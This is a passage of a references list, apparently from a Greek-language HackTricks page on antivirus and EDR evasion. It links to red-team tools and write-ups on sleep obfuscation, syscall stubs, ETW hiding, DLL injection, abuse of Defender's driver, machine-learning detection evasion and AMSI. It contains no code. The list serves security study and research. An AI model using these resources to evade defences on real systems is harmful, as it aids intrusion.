- [31] [Obfuscation ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Οπλοποίηση του remediation driver του Defender ως primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία self-masking functions με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Κώδικας πηγής InjectSetConsole του TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Αναδημιουργία εργαλείων C# με WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Μεταγλώττιση έργων C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept και πηγαίος κώδικας DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Κατάχρηση των εσωτερικών του thread pool για έγχυση DLL χωρίς shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Σύνολο δεδομένων benchmark EMBER2024 και εργαλεία thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Χρήση του EMBER2024 για την αξιολόγηση εμφυτευμάτων red team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Αποφυγή ανιχνεύσεων βασισμένων σε machine learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Πλαίσιο φόρτωσης .NET βασισμένο σε XAML, NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Απαρίθμηση AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Μέθοδος IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
